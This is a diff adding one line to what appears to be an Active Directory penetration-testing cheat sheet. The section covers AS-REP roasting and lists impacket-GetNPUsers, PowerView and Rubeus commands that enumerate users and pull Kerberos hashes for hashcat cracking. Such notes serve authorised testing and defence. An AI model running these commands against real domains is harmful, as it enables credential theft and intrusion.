@@ -381,6 +381,7 @@ PS> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT
 Some kerberos users may have been configured to not require Kerberos Pre Auth, leading to their hash being sent when an authentication request is made before providing valid identification.
 
 ```shell!
+$ impacket-GetNPUsers -dc-ip DC01 domain/username:password # list users + groups
 $ impacket-GetNPUsers -dc-ip IP -usersfile valid_users.txt domain/junkusername -no-pass
 PS> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
 PS> .\Rubeus.exe asreproast /user:cn /nowrap /format:hashcat
